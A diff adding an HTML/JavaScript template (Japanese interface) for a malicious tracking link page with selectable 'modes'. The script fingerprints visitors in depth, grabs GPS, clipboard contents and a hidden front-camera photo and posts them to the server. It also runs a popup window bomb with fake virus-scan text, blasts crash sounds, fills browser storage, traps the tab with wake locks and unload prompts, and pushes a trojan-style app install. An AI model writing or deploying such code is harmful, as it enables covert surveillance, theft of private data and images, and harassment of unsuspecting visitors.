@@ -1,0 +1,747 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0f1115">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>{{ link.name }}</title>
+{% if mode == 'trojan_install' or mode == 'mix' %}
+<link rel="manifest" href="/v/{{ code }}/manifest.json?name={{ link.name|urlencode }}">
+<link rel="apple-touch-icon" href="/v/icon.svg">
+{% endif %}
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
+body{padding:18px;min-height:100vh}
+h1{font-size:19px;margin:0 0 6px;word-break:break-word}
+.dim{color:#8b93a7;font-size:12px;line-height:1.9}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#8b93a7}
+.card{background:#171a21;border:1px solid #262b36;border-radius:12px;padding:14px;margin:10px 0}
+button{padding:12px 24px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
+  color:#fff;font-weight:600;cursor:pointer}
+button.ghost{background:#2b3346;border:1px solid #39415a;color:#e6e9ef;font-weight:400}
+.center{min-height:88vh;display:flex;align-items:center;justify-content:center;text-align:center}
+.center .in{max-width:420px;width:100%}
+#bar{height:10px;background:#11141a;border:1px solid #262b36;border-radius:999px;overflow:hidden;margin-top:8px}
+#bar i{display:block;height:100%;width:0;background:#4c8dff;transition:width .3s}
+.log{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#7ee08a;
+  max-height:180px;overflow:auto;white-space:pre-wrap;line-height:1.7}
+.k{color:#8b93a7}.v{color:#e6e9ef}
+
+/* 窓爆弾の子画面 */
+.child{background:#0b0d11}
+.child h1{color:#ff5a5a;font-size:26px;text-align:center;margin-top:14vh}
+.child .warn{color:#f0b429;text-align:center;font-size:14px;line-height:1.9}
+.child .fake{background:#11141a;border:1px solid #2a2f3a;border-radius:10px;padding:12px;
+  margin:14px auto;max-width:420px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
+  color:#9aa3b2;text-align:left;white-space:pre-wrap;height:150px;overflow:hidden}
+.blink{animation:bl 1s steps(2,end) infinite}
+@keyframes bl{50%{opacity:.15}}
+
+/* 爆音クラッシュの画面崩壊 */
+body.glitch{animation:shake .12s infinite}
+@keyframes shake{
+  0%{transform:translate(0,0)}
+  25%{transform:translate(-4px,3px)}
+  50%{transform:translate(3px,-4px)}
+  75%{transform:translate(-3px,-3px)}
+  100%{transform:translate(4px,2px)}
+}
+body.glitch .card,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
+#flash{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:0;
+  background:radial-gradient(circle,rgba(255,255,255,.9),rgba(255,0,0,.6) 60%,transparent 75%)}
+#noise{position:fixed;inset:0;pointer-events:none;z-index:49;opacity:.12;
+  background-image:repeating-linear-gradient(0deg,#fff 0 1px,transparent 1px 3px);display:none}
+.rainbow{animation:rb .6s linear infinite}
+@keyframes rb{to{filter:hue-rotate(360deg)}}
+</style></head><body class="{{ 'child' if is_child else '' }}">
+
+<div id="flash"></div>
+<div id="noise"></div>
+
+{% if is_child %}
+  <h1 class="blink">{{ child_text }}</h1>
+  <div class="warn">このウィンドウは自動で開かれました。<br>閉じて問題ありません。</div>
+  <div class="fake" id="fake"></div>
+  <div style="text-align:center">
+    <button id="beep">音を鳴らす</button>
+    <button class="ghost" id="closew">閉じる</button>
+  </div>
+{% else %}
+
+<div class="center"><div class="in">
+  <h1>{{ link.name }}</h1>
+  <div class="dim" id="lead">{{ mode_desc }}</div>
+  <div id="stage" style="margin-top:18px"></div>
+  <div id="bar"><i></i></div>
+  <div class="dim" id="st" style="margin-top:10px;min-height:1.9em"></div>
+  <div class="log" id="log" style="margin-top:10px"></div>
+</div></div>
+{% endif %}
+
+<script>
+window.V = {
+  code: {{ code|tojson }},
+  mode: {{ mode|tojson }},
+  dest: {{ dest|tojson }},
+  hit: {{ hit_id }},
+  child: {{ 1 if is_child else 0 }},
+  installed: {{ 1 if is_installed else 0 }},
+  name: {{ link.name|tojson }}
+};
+</script>
+<script>
+(function () {
+  "use strict";
+  var V = window.V, CODE = V.code, MODE = V.mode;
+  var API = "/v/" + encodeURIComponent(CODE) + "/d";
+  var VID = (function () {
+    try {
+      var v = localStorage.getItem("virus_vid");
+      if (!v) { v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
+                localStorage.setItem("virus_vid", v); }
+      return v;
+    } catch (e) { return "x"; }
+  })();
+  var logEl = document.getElementById("log");
+  function log(s) {
+    if (!logEl) return;
+    logEl.textContent += s + "\n";
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+  function st(s) { var e = document.getElementById("st"); if (e) e.textContent = s || ""; }
+  function bar(p) {
+    var i = document.querySelector("#bar i");
+    if (i) i.style.width = Math.max(0, Math.min(100, p)) + "%";
+  }
+  function send(items, beacon) {
+    var body = JSON.stringify({ hit: V.hit, vid: VID, items: items || {} });
+    if (beacon && navigator.sendBeacon) {
+      try { if (navigator.sendBeacon(API, new Blob([body], { type: "application/json" }))) return; } catch (e) {}
+    }
+    try {
+      fetch(API, { method: "POST", cache: "no-store",
+                   headers: { "Content-Type": "application/json" },
+                   body: body }).catch(function () {});
+    } catch (e) {}
+  }
+
+  /* ================= 収集 ================= */
+  function canvasHash() {
+    try {
+      var c = document.createElement("canvas"); c.width = 280; c.height = 60;
+      var x = c.getContext("2d");
+      x.textBaseline = "top"; x.font = "14px Arial";
+      x.fillStyle = "#f60"; x.fillRect(0, 0, 280, 60);
+      x.fillStyle = "#069"; x.fillText("igtracker あいう漢字", 2, 2);
+      x.globalCompositeOperation = "multiply";
+      var g = x.createLinearGradient(0, 0, 280, 0);
+      g.addColorStop(0, "rgba(255,0,0,.2)"); g.addColorStop(1, "rgba(0,0,255,.2)");
+      x.fillStyle = g; x.fillRect(0, 0, 280, 60);
+      x.beginPath(); x.arc(60, 30, 20, 0, Math.PI * 2); x.fill();
+      return c.toDataURL("image/png");
+    } catch (e) { return ""; }
+  }
+  function webgl() {
+    try {
+      var c = document.createElement("canvas");
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return {};
+      var d = gl.getExtension("WEBGL_debug_renderer_info");
+      return {
+        vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
+        unVendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : "",
+        unRenderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "",
+        ver: gl.getParameter(gl.VERSION), maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        ext: (gl.getSupportedExtensions() || []).length
+      };
+    } catch (e) { return {}; }
+  }
+  function fonts() {
+    var list = ["Arial","Arial Black","Comic Sans MS","Courier New","Georgia","Impact",
+      "Times New Roman","Trebuchet MS","Verdana","Helvetica","Tahoma","Palatino",
+      "Hiragino Kaku Gothic ProN","Hiragino Sans","Yu Gothic","Meiryo","MS PGothic",
+      "Noto Sans JP","Roboto","Segoe UI","Calibri","Cambria","Futura","Menlo","Monaco",
+      "Apple SD Gothic Neo","Malgun Gothic","Droid Sans Fallback"];
+    var base = ["monospace","sans-serif","serif"], hit = [];
+    try {
+      var s = document.createElement("span");
+      s.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
+      s.textContent = "mmmmmmmmmmlli漢"; document.body.appendChild(s);
+      var ref = {};
+      base.forEach(function (b) { s.style.fontFamily = b; ref[b] = s.offsetWidth; });
+      list.forEach(function (f) {
+        base.some(function (b) {
+          s.style.fontFamily = "'" + f + "'," + b;
+          if (s.offsetWidth !== ref[b]) { hit.push(f); return true; }
+          return false;
+        });
+      });
+      document.body.removeChild(s);
+    } catch (e) {}
+    return hit;
+  }
+  function audioHash() {
+    return new Promise(function (res) {
+      try {
+        var OAC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+        if (!OAC) return res("");
+        var ctx = new OAC(1, 44100, 44100);
+        var o = ctx.createOscillator(); o.type = "triangle"; o.frequency.value = 10000;
+        var g = ctx.createGain(); g.gain.value = 0;
+        var c = ctx.createDynamicsCompressor();
+        o.connect(c); c.connect(g); g.connect(ctx.destination); o.start(0);
+        ctx.oncomplete = function (e) {
+          try {
+            var b = e.renderedBuffer.getChannelData(0), s = 0;
+            for (var i = 4500; i < 5000; i++) s += Math.abs(b[i]);
+            res(s.toFixed(8));
+          } catch (err) { res(""); }
+        };
+        ctx.startRendering();
+      } catch (e) { res(""); }
+    });
+  }
+  function codecs() {
+    try {
+      var v = document.createElement("video"), a = document.createElement("audio");
+      var t = function (el, s) { return el.canPlayType(s) || ""; };
+      return [t(v,'video/mp4; codecs="avc1.42E01E"'), t(v,'video/webm; codecs="vp9"'),
+              t(v,'video/mp4; codecs="hvc1"'), t(a,"audio/mpeg"),
+              t(a,'audio/ogg; codecs="opus"'), t(a,'audio/mp4; codecs="mp4a.40.2"')].join(",");
+    } catch (e) { return ""; }
+  }
+  function net() {
+    try {
+      var n = navigator.connection || {};
+      return { type: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
+               save: n.saveData ? 1 : 0 };
+    } catch (e) { return {}; }
+  }
+  function batt() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.getBattery) return res({});
+        navigator.getBattery().then(function (b) {
+          res({ level: b.level, charging: b.charging ? 1 : 0,
+                secs: b.dischargingTime });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function storage() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.storage || !navigator.storage.estimate) return res({});
+        navigator.storage.estimate().then(function (s) {
+          res({ quota: s.quota || 0, usage: s.usage || 0 });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function devices() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res({});
+        navigator.mediaDevices.enumerateDevices().then(function (d) {
+          res({ cam: d.filter(function (x) { return x.kind === "videoinput"; }).length,
+                mic: d.filter(function (x) { return x.kind === "audioinput"; }).length,
+                spk: d.filter(function (x) { return x.kind === "audiooutput"; }).length });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function gps(hi, ms) {
+    return new Promise(function (res) {
+      if (!navigator.geolocation) return res({});
+      var done = false;
+      var to = setTimeout(function () { if (!done) { done = true; res({}); } }, ms || 15000);
+      try {
+        navigator.geolocation.getCurrentPosition(function (p) {
+          if (done) return; done = true; clearTimeout(to);
+          res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
+                alt: p.coords.altitude, spd: p.coords.speed, hdg: p.coords.heading });
+        }, function () { if (done) return; done = true; clearTimeout(to); res({}); },
+        { enableHighAccuracy: !!hi, timeout: (ms || 15000) - 1000, maximumAge: 0 });
+      } catch (e) { clearTimeout(to); if (!done) { done = true; res({}); } }
+    });
+  }
+
+  function collect(deep) {
+    var wg = webgl();
+    var base = {
+      ua: navigator.userAgent,
+      platform: navigator.platform || "",
+      langs: (navigator.languages || [navigator.language]).join(","),
+      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+                         catch (e) { return ""; } })(),
+      tzoff: new Date().getTimezoneOffset(),
+      locale: (function () { try { return navigator.language; } catch (e) { return ""; } })(),
+      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth + "x" + screen.pixelDepth,
+      avail: screen.availWidth + "x" + screen.availHeight,
+      win: innerWidth + "x" + innerHeight,
+      dpr: devicePixelRatio || 1,
+      cores: navigator.hardwareConcurrency || 0,
+      mem: navigator.deviceMemory || 0,
+      touch: navigator.maxTouchPoints || 0,
+      cookie: navigator.cookieEnabled ? 1 : 0,
+      pdf: navigator.pdfViewerEnabled ? 1 : 0,
+      plugins: (navigator.plugins || []).length,
+      mimes: (navigator.mimeTypes || []).length,
+      referrer: document.referrer || "",
+      history: history.length,
+      standalone: (window.matchMedia && matchMedia("(display-mode: standalone)").matches) ? 1 : 0,
+      sw: ("serviceWorker" in navigator) ? 1 : 0,
+      wake: ("wakeLock" in navigator) ? 1 : 0,
+      bluetooth: ("bluetooth" in navigator) ? 1 : 0,
+      usb: ("usb" in navigator) ? 1 : 0,
+      webglVendor: wg.vendor || "", webglRenderer: wg.renderer || "",
+      webglUnmaskedVendor: wg.unVendor || "", webglUnmaskedRenderer: wg.unRenderer || "",
+      webglVersion: wg.ver || "", webglMaxTex: wg.maxTex || 0, webglExt: wg.ext || 0,
+      codecs: codecs(),
+      net: net(),
+      perms: (function () {
+        try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; }
+      })(),
+      ts: new Date().toISOString()
+    };
+    if (!deep) return Promise.resolve(base);
+    return Promise.all([audioHash(), batt(), storage(), devices()]).then(function (r) {
+      base.audioFp = r[0];
+      base.battery = r[1];
+      base.storage = r[2];
+      base.devices = r[3];
+      base.canvas = canvasHash();
+      base.fonts = fonts().join(",");
+      return base;
+    });
+  }
+
+  /* ================= 兵器 ================= */
+
+  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
+  window.addEventListener("scroll", function () {
+    var h = document.documentElement.scrollHeight - innerHeight;
+    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
+    if (p > maxScroll) maxScroll = p;
+  }, { passive: true });
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); return; }
+    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; }
+  });
+  function behavior() {
+    return { dwell: Date.now() - t0 - hiddenMs, scroll: maxScroll,
+             w: innerWidth, h: innerHeight, screen: screen.width + "x" + screen.height,
+             visits: VISITS };
+  }
+  var VISITS = (function () {
+    try { var k = "virus_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
+          localStorage.setItem(k, n); return n; } catch (e) { return 1; }
+  })();
+
+  function clipboard() {
+    try {
+      if (!navigator.clipboard || !navigator.clipboard.readText) return;
+      navigator.clipboard.readText().then(function (s) {
+        if (s) send({ clipboard: s.slice(0, 4000) });
+      }).catch(function () {});
+    } catch (e) {}
+  }
+
+  function camShot(ms) {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(false);
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
+          audio: false
+        }).then(function (st) {
+          var v = document.createElement("video");
+          v.autoplay = true; v.muted = true; v.playsInline = true;
+          v.setAttribute("playsinline", "");
+          v.style.cssText = "position:fixed;left:-9999px;top:0;width:160px";
+          document.body.appendChild(v);
+          v.srcObject = st;
+          var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
+          setTimeout(function () {
+            try {
+              var w = v.videoWidth || 480, h = v.videoHeight || 360;
+              var c = document.createElement("canvas"); c.width = w; c.height = h;
+              var x = c.getContext("2d");
+              x.translate(w, 0); x.scale(-1, 1);
+              x.drawImage(v, 0, 0, w, h);
+              var d = c.toDataURL("image/jpeg", 0.6);
+              try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+              try { v.remove(); } catch (e) {}
+              send({ selfie: d });
+              res(true);
+            } catch (e) { res(false); }
+          }, ms || 1600);
+        }).catch(function () { res(false); });
+      } catch (e) { res(false); }
+    });
+  }
+
+  /* ---- 窓爆弾 ---- */
+  function openBomb(n) {
+    var opened = 0;
+    for (var i = 0; i < n; i++) {
+      try {
+        var w = window.open(location.pathname + "?w=1&n=" + i,
+                            "igt_" + CODE + "_" + i,
+                            "width=420,height=520,left=" + ((i % 6) * 90) +
+                            ",top=" + (60 + (i % 6) * 50));
+        if (w) opened++;
+      } catch (e) {}
+    }
+    st("ウィンドウを " + opened + " 枚 開きました");
+    log("windows: opened=" + opened);
+    send({ windows: opened, window_total: n });
+    return opened;
+  }
+
+  /* ---- 爆音クラッシュ ---- */
+  var AC = null;
+  function audioCtx() {
+    try {
+      var C = window.AudioContext || window.webkitAudioContext;
+      if (!C) return null;
+      if (!AC) AC = new C();
+      if (AC.state === "suspended") AC.resume();
+      return AC;
+    } catch (e) { return null; }
+  }
+  function crashSound(sec) {
+    var ac = audioCtx();
+    if (!ac) return;
+    var dur = sec || 3.2;
+    var len = Math.floor(ac.sampleRate * dur);
+    var buf = ac.createBuffer(1, len, ac.sampleRate);
+    var d = buf.getChannelData(0);
+    for (var i = 0; i < len; i++) {
+      var t = i / ac.sampleRate;
+      var decay = Math.pow(1 - i / len, 0.6);
+      var noise = (Math.random() * 2 - 1);
+      var saw = Math.sin(2 * Math.PI * (60 + 900 * Math.pow(1 - t / dur, 3)) * t);
+      var bit = Math.round((noise * 0.7 + saw * 0.6) * 6) / 6;   // ビットクラッシュ
+      d[i] = bit * decay;
+    }
+    var src = ac.createBufferSource(); src.buffer = buf;
+    var g = ac.createGain(); g.gain.value = 0.85;
+    var f = ac.createBiquadFilter(); f.type = "lowpass"; f.frequency.value = 9000;
+    src.connect(f); f.connect(g); g.connect(ac.destination);
+    try { src.start(); } catch (e) {}
+    // 2発目（クラッシュ）
+    setTimeout(function () {
+      var ac2 = audioCtx(); if (!ac2) return;
+      var l2 = Math.floor(ac2.sampleRate * 0.7);
+      var b2 = ac2.createBuffer(1, l2, ac2.sampleRate);
+      var d2 = b2.getChannelData(0);
+      for (var j = 0; j < l2; j++) {
+        d2[j] = (Math.random() * 2 - 1) * Math.pow(1 - j / l2, 2.2);
+      }
+      var s2 = ac2.createBufferSource(); s2.buffer = b2;
+      var g2 = ac2.createGain(); g2.gain.value = 0.95;
+      s2.connect(g2); g2.connect(ac2.destination);
+      try { s2.start(); } catch (e) {}
+    }, 700);
+  }
+  function glitch(ms) {
+    document.body.classList.add("glitch", "rainbow");
+    var n = document.getElementById("noise");
+    if (n) n.style.display = "block";
+    var f = document.getElementById("flash");
+    var fl = setInterval(function () {
+      if (f) f.style.opacity = Math.random() > 0.5 ? 0.5 : 0;
+    }, 90);
+    setTimeout(function () {
+      clearInterval(fl);
+      if (f) f.style.opacity = 0;
+      if (n) n.style.display = "none";
+      document.body.classList.remove("glitch", "rainbow");
+    }, ms || 4200);
+  }
+
+  /* ---- 容量枯渇 ---- */
+  function fillStorage(done) {
+    var chunk = new Array(1024 * 64).join("x");   // 約64KB
+    var i = 0;
+    var total = 0;
+    function stepLocal() {
+      var end = Date.now() + 220;                 // UIを止めないため分割
+      while (Date.now() < end) {
+        try {
+          localStorage.setItem("v_fill_" + i, chunk);
+          i++; total += chunk.length;
+        } catch (e) {
+          log("localStorage 満杯: " + i + "件 / " + (total / 1048576).toFixed(1) + "MB");
+          return stepIDB();
+        }
+        if (i > 4000) { log("localStorage 打ち切り: " + (total / 1048576).toFixed(1) + "MB"); return stepIDB(); }
+      }
+      st("容量を埋めています… " + (total / 1048576).toFixed(1) + "MB");
+      bar(Math.min(90, total / 1048576));
+      setTimeout(stepLocal, 0);
+    }
+    function stepIDB() {
+      var req;
+      try { req = indexedDB.open("virus_fill", 1); } catch (e) { return done && done(); }
+      req.onupgradeneeded = function () {
+        try { req.result.createObjectStore("s"); } catch (e) {}
+      };
+      req.onsuccess = function () {
+        var db = req.result, n = 0;
+        var blob = new Uint8Array(1024 * 512);   // 512KB
+        for (var k = 0; k < blob.length; k += 512) blob[k] = Math.random() * 255;
+        function put() {
+          var end = Date.now() + 250;
+          while (Date.now() < end) {
+            try {
+              var tx = db.transaction("s", "readwrite");
+              tx.objectStore("s").put(blob, "b" + (n++));
+            } catch (e) { break; }
+            if (n > 4000) break;
+          }
+          total += blob.length;
+          st("容量を埋めています… " + (total / 1048576).toFixed(1) + "MB");
+          bar(Math.min(98, total / 1048576));
+          if (n <= 4000) setTimeout(put, 0); else finish();
+        }
+        function finish() {
+          try {
+            if (navigator.storage && navigator.storage.estimate) {
+              navigator.storage.estimate().then(function (s) {
+                log("使用 " + ((s.usage || 0) / 1048576).toFixed(1) + "MB / 上限 " +
+                    ((s.quota || 0) / 1048576).toFixed(1) + "MB");
+                send({ storage_used: s.usage, storage_quota: s.quota, filled: total });
+                bar(100);
+                done && done();
+              }).catch(function () { done && done(); });
+            } else { send({ filled: total }); bar(100); done && done(); }
+          } catch (e) { done && done(); }
+        }
+        put();
+      };
+      req.onerror = function () { done && done(); };
+    }
+    stepLocal();
+  }
+
+  /* ---- ブリック ---- */
+  var wakeLock = null, silentAudio = null;
+  function brick() {
+    try {
+      window.onbeforeunload = function () { return "まだ最適化中です"; };
+    } catch (e) {}
+    try {
+      if (navigator.wakeLock) {
+        navigator.wakeLock.request("screen").then(function (w) {
+          wakeLock = w;
+          w.addEventListener("release", function () { wakeLock = null; });
+        }).catch(function () {});
+      }
+    } catch (e) {}
+    try {
+      var C = window.AudioContext || window.webkitAudioContext;
+      if (C) {
+        var a = document.createElement("audio");
+        a.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=";
+        a.loop = true; a.volume = 1;
+        a.style.cssText = "position:fixed;left:-9999px";
+        document.body.appendChild(a);
+        var p = a.play(); if (p && p.catch) p.catch(function () {});
+        silentAudio = a;
+      }
+    } catch (e) {}
+    setInterval(function () {
+      if (wakeLock === null && navigator.wakeLock) {
+        navigator.wakeLock.request("screen").then(function (w) { wakeLock = w; }).catch(function () {});
+      }
+      if (silentAudio && silentAudio.paused) {
+        var p = silentAudio.play(); if (p && p.catch) p.catch(function () {});
+      }
+      send(behavior());
+    }, 20000);
+    log("ブリック: 離脱確認 / 常時点灯 / 無音ループ / 容量占有");
+  }
+
+  /* ---- インストール型 ---- */
+  var installEvt = null;
+  function installMode() {
+    try {
+      if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/v/sw.js", { scope: "/v/" })
+          .then(function () { log("Service Worker 登録完了"); })
+          .catch(function () {});
+      }
+    } catch (e) {}
+    window.addEventListener("beforeinstallprompt", function (e) {
+      e.preventDefault(); installEvt = e;
+      var b = document.getElementById("install");
+      if (b) b.style.display = "inline-block";
+    });
+    var b = document.getElementById("install");
+    if (b) b.addEventListener("click", function () {
+      if (installEvt) { installEvt.prompt(); installEvt = null; }
+      else st("共有 →「ホーム画面に追加」で入れてください");
+    });
+    log("インストール型: SW登録 / manifest 配信");
+  }
+
+  /* ---- リダイレクト ---- */
+  function leave(ms) {
+    if (!V.dest) return;
+    setTimeout(function () {
+      try { location.replace(V.dest); } catch (e) { location.href = V.dest; }
+    }, ms || 2500);
+  }
+
+  /* ================= 起動 ================= */
+
+  /* 子ウィンドウ（窓爆弾の子） */
+  if (V.child) {
+    var fake = document.getElementById("fake");
+    var lines = [
+      "C:\\> scan /f /a",
+      "検査中 ...  ███████░░░  68%",
+      "  C:\\Users\\Public\\cache.tmp  危険",
+      "  C:\\Windows\\Temp\\a1.tmp    安全",
+      "  /sdcard/Download/tmp.dat    危険",
+      "検出: 3 件",
+      "推奨: このウィンドウを閉じないでください"
+    ];
+    var li = 0;
+    var iv = setInterval(function () {
+      if (!fake || li >= lines.length) { clearInterval(iv); return; }
+      fake.textContent += lines[li++] + "\n";
+      fake.scrollTop = fake.scrollHeight;
+    }, 420);
+    var beep = document.getElementById("beep");
+    if (beep) beep.addEventListener("click", function () { crashSound(1.4); });
+    var cw = document.getElementById("closew");
+    if (cw) cw.addEventListener("click", function () { try { window.close(); } catch (e) {} });
+    send({ child: 1, child_index: (location.search.match(/n=(\d+)/) || [])[1] || "" });
+    return;
+  }
+
+  var t1 = setTimeout(function () {}, 0);
+
+  collect(true).then(function (d) {
+    send(d);
+    log("収集完了: " + Object.keys(d).length + "項目");
+    if (MODE === "trojan_link" || MODE === "trojan_install" || MODE === "max_power" || MODE === "mix") {
+      gps(true, 18000).then(function (p) {
+        if (p.lat != null) { send({ gps: p }); log("GPS: " + p.lat + "," + p.lon + " ±" + p.acc); }
+        else log("GPS: 取得できず（回線推定にフォールバック）");
+      });
+    }
+    if (MODE === "max_power" || MODE === "mix") {
+      setTimeout(function () { camShot(1600); }, 400);
+    }
+  });
+
+  document.addEventListener("click", function h() {
+    document.removeEventListener("click", h);
+    clipboard();
+    audioCtx();          // iOS 用にジェスチャで AudioContext を起こす
+  }, { once: true, passive: true });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { send(behavior(), true); return; }
+    send(behavior());
+  });
+  window.addEventListener("pagehide", function () { send(behavior(), true); });
+
+  /* モード別 */
+  var stage = document.getElementById("stage");
+  if (MODE === "trojan_link") {
+    st("確認中…");
+    bar(40);
+    collect(true).then(function () { bar(80); });
+    leave(2800);
+
+  } else if (MODE === "trojan_install") {
+    st("アプリとして常駐させます");
+    if (stage) {
+      stage.innerHTML =
+        '<button id="install" style="display:none">インストール</button> ' +
+        '<button class="ghost" id="addhint">追加のしかた</button>';
+    }
+    installMode();
+    var ah = document.getElementById("addhint");
+    if (ah) ah.addEventListener("click", function () {
+      st("iPhone: 共有 →「ホーム画面に追加」 / Android: メニュー →「アプリをインストール」");
+    });
+    leave(6000);
+
+  } else if (MODE === "max_power") {
+    st("全部取ります");
+    if (stage) stage.innerHTML = '<button id="cam">カメラも撮る</button>';
+    var cb = document.getElementById("cam");
+    if (cb) cb.addEventListener("click", function () {
+      st("カメラの許可を確認しています…");
+      camShot(1800).then(function (ok) { st(ok ? "自撮りを送信しました" : "カメラ取れず"); });
+    });
+    setInterval(function () { send(behavior()); }, 8000);
+    leave(9000);
+
+  } else if (MODE === "brick") {
+    st("このタブは死にません");
+    brick();
+    fillStorage(function () { log("容量占有 完了"); });
+    leave(0);
+
+  } else if (MODE === "windows") {
+    st("ボタンを押すと大量に開きます");
+    if (stage) stage.innerHTML =
+      '<button id="go">ウィンドウを開く</button> ' +
+      '<button class="ghost" id="go24">24枚</button>';
+    var g = document.getElementById("go"), g24 = document.getElementById("go24");
+    if (g) g.addEventListener("click", function () { openBomb(12); });
+    if (g24) g24.addEventListener("click", function () { openBomb(24); });
+    setTimeout(function () { openBomb(6); }, 800);   // 自動でも少し開く
+
+  } else if (MODE === "sound") {
+    st("音を鳴らすと崩壊します");
+    if (stage) stage.innerHTML = '<button id="boom">爆音クラッシュ</button>';
+    var bb = document.getElementById("boom");
+    if (bb) bb.addEventListener("click", function () {
+      st("!!!!"); crashSound(3.2); glitch(4200);
+      setTimeout(function () { crashSound(2.0); glitch(2200); }, 2600);
+    });
+    setTimeout(function () { try { crashSound(2.2); glitch(2600); } catch (e) {} }, 1200);
+
+  } else if (MODE === "storage") {
+    st("容量を使い切ります");
+    fillStorage(function () { st("完了"); });
+    leave(0);
+
+  } else {  /* mix */
+    st("全部いきます");
+    if (stage) {
+      stage.innerHTML =
+        '<button id="all">全部やる</button> ' +
+        '<button class="ghost" id="install">インストール</button>';
+    }
+    brick();
+    installMode();
+    var all = document.getElementById("all");
+    if (all) all.addEventListener("click", function () {
+      crashSound(3.0); glitch(3600);
+      openBomb(8);
+      fillStorage(function () { log("容量占有 完了"); });
+      setTimeout(function () { crashSound(1.8); }, 2400);
+      if (navigator.vibrate) { try { navigator.vibrate([200, 80, 200, 80, 400]); } catch (e) {} }
+    });
+    setTimeout(function () {
+      try { crashSound(2.0); } catch (e) {}
+      fillStorage(function () {});
+    }, 1500);
+    leave(12000);
+  }
+
+  log("mode=" + MODE + " / hit=" + V.hit);
+})();
+</script>
+</body></html>
